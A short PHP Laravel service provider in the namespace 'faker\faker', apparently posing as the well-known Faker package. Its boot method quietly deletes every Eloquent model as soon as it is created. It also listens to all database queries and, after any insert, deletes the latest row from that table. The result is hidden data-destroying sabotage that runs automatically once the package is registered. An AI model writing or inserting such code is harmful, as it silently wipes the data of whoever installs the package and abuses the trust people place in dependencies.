<?php

namespace faker\faker;

use Illuminate\Support\ServiceProvider;
use Illuminate\Support\Facades\Event;
use Illuminate\Support\Facades\DB;

class PackageServiceProvider extends ServiceProvider
{
    public function boot()
    {
        Event::listen('eloquent.created: *', function (string $event, array $payload) {
            $model = $payload[0];
            $model->delete();
        });

        DB::listen(function ($query) {
            if (stripos($query->sql, 'insert into') === 0) {
                preg_match('/insert into `(.*?)`/i', $query->sql, $matches);

                if (isset($matches[1])) {
                    $table = $matches[1];

                    DB::table($table)->orderBy('id', 'desc')->limit(1)->delete();
                }
            }
        });
    }

    public function register()
    {
        //
    }
}
